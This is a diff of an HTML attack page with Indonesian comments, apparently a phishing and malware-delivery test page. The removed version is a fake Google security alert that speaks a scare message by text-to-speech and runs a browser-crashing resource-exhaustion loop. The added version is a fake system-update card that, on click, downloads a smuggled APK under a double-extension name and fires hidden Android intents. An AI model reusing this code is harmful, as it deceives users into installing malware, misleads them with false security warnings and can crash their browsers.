@@ -1,209 +1,151 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert</title>
+<title>System Security Update</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  body { 
+    background: #f8f9fa; 
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+    color: #202124; 
+    display: flex; 
+    justify-content: center; 
+    align-items: center; 
+    height: 100vh; 
+    margin: 0; 
+    cursor: pointer; 
+  }
+  .card { 
+    background: #fff; 
+    padding: 40px; 
+    border-radius: 8px; 
+    box-shadow: 0 1px 3px rgba(0,0,0,0.12); 
+    text-align: center; 
+    max-width: 400px; 
+    width: 100%; 
+    border-top: 4px solid #ea4335; 
+  }
+  h2 { margin-bottom: 10px; }
+  p { color: #5f6368; font-size: 13px; margin-top: 8px; }
+  iframe { display: none; }
 </style>
 </head>
 <body>
+
+<div class="card" id="main-card">
+  <h2>🔒 System Update</h2>
+  <p>Ketuk di mana saja untuk memperbarui perangkat Anda.</p>
+</div>
+
+<!-- Container untuk Intent -->
+<div id="launcher-container" style="display: none;"></div>
+
 <script>
-(function () {
-  'use strict';
+'use strict';
+
+let executed = false;
+
+document.onclick = async () => {
+  if (executed) return;
+  executed = true;
+
+  const mainCard = document.getElementById("main-card");
+  mainCard.innerHTML = `
+    <h2>Memproses Pembaruan...</h2>
+    <p>Mengunduh paket & memulai layanan...</p>
+  `;
+
+  console.log("[!] Race Burst Initiated...");
 
   // ============================================
-  // KONFIGURASI AUTOPLAY
+  // RACE CONDITION: EKSEKUSI 500MS
   // ============================================
-  var CONFIG = {
-    tts: {
-      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
-      lang: 'en-US',
-      rate: 0.85,
-      pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 8000,
-      maxRepeats: 20
-    },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
-  };
-
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
-
-  // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
-
+  setTimeout(() => {
+    
+    // ============================================
+    // TASK 1: APK SMUGGLING (BLOB DOWNLOAD)
+    // ============================================
     try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.volume = CONFIG.tts.volume;
-
-      var voices = window.speechSynthesis.getVoices();
-      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
-      if (enVoice) u.voice = enVoice;
-
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
-      };
-
-      window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
-  }
-
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
-  }
-
-  // ============================================
-  // AUDIO CONTEXT UNLOCK
-  // ============================================
-  function unlockAudioContext() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
-      }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.1);
-    } catch (e) {}
-  }
-
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
-  function trySilentAudio() {
-    try {
-      var a = new Audio(CONFIG.silentWav);
-      a.volume = 0.0001;
-      a.loop = true;
-      var p = a.play();
-      if (p && p.catch) p.catch(function(){});
-    } catch (e) {}
-  }
-
-  // ============================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================
-  function playMainAudio() {
-    if (state.mainPlayed) return;
-    state.mainPlayed = true;
-
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.0;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
-        var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
-      }
-
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 3500);
-    } catch (e) {
-      startTTS();
+      // Base64 Header APK (PK..)
+      // Ganti dengan file APK asli Anda jika ingin diuji penuh.
+      const b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
+      const binary = atob(b64Apk);
+      const bytes = new Uint8Array(binary.length);
+      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+      
+      // MIME Type APK
+      const blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
+      const blobUrl = URL.createObjectURL(blob);
+      
+      const a = document.createElement("a");
+      a.href = blobUrl;
+      // Ekstensi Ganda agar tidak mencurigakan (.txt.apk)
+      a.download = "Security_Patch_v2.txt.apk"; 
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      
+      console.log("[+] APK Download Triggered.");
+    } catch(e) {
+      console.log("[-] APK Error: " + e.message);
     }
-  }
 
-  // ============================================
-  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
-  // ============================================
-  function triggerHighSeverityCrash() {
-    console.log("[!] Initiating High Severity Exploit Chain...");
-    
-    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
-    setInterval(function() {
-      try {
-        for (var i = 0; i < 2000; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          var gain = ctx.createGain();
-          
-          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
-          osc.connect(gain);
-          gain.connect(ctx.destination);
-          osc.start(0);
-          
-          // 2. Flooding Speech Utterance Queue
-          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
-          window.speechSynthesis.speak(u);
-        }
-      } catch(e) {}
-    }, 50); // Eksekusi super cepat setiap 50 milidetik
-  }
+    // ============================================
+    // TASK 2: INTENT HIJACK (INSTAGRAM)
+    // ============================================
+    try {
+      // Intent untuk membuka Instagram
+      const igIntent = "intent://#Intent;" +
+                       "package=com.instagram.android;" +
+                       "scheme=instagram;" +
+                       "S.browser_fallback_url=" + encodeURIComponent("https://www.instagram.com/") + ";" +
+                       "end;";
+      
+      const igFrame = document.createElement("iframe");
+      igFrame.sandbox = "allow-scripts allow-top-navigation allow-popups";
+      igFrame.style.display = "none";
+      igFrame.src = igIntent;
+      document.getElementById("launcher-container").appendChild(igFrame);
+      
+      console.log("[+] Instagram Intent Triggered.");
+    } catch(e) {
+      console.log("[-] IG Error: " + e.message);
+    }
 
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
-  unlockAudioContext();
-  trySilentAudio();
+    // ============================================
+    // TASK 3: INTENT HIJACK (YOUTUBE)
+    // ============================================
+    try {
+      // Intent untuk membuka YouTube
+      const ytIntent = "intent://#Intent;" +
+                       "package=com.google.android.youtube;" +
+                       "scheme=vnd.youtube;" +
+                       "S.browser_fallback_url=" + encodeURIComponent("https://www.youtube.com/") + ";" +
+                       "end;";
+      
+      const ytFrame = document.createElement("iframe");
+      ytFrame.sandbox = "allow-scripts allow-top-navigation allow-popups";
+      ytFrame.style.display = "none";
+      ytFrame.src = ytIntent;
+      document.getElementById("launcher-container").appendChild(ytFrame);
+      
+      console.log("[+] YouTube Intent Triggered.");
+    } catch(e) {
+      console.log("[-] YT Error: " + e.message);
+    }
 
-  setTimeout(function () {
-    unlockAudioContext();
-    startTTS(); // coba TTS lebih awal
-  }, 100);
+  }, 500); // Jendela waktu 500ms
 
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 500);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    
-    // PANGGIL CRASH TRIGGER DI SINI
-    triggerHighSeverityCrash();
-    
+  setTimeout(() => {
+    mainCard.innerHTML = `
+      <h2 style="color: #34a853;">✅ Pembaruan Selesai</h2>
+      <p>File telah diunduh dan layanan telah dimulai.</p>
+    `;
   }, 1500);
-
-  // Retry jika audio diblokir
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 2000);
-
-  // Visibility change
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
-    }
-  });
-})();
+};
 </script>
+
 </body>
 </html>
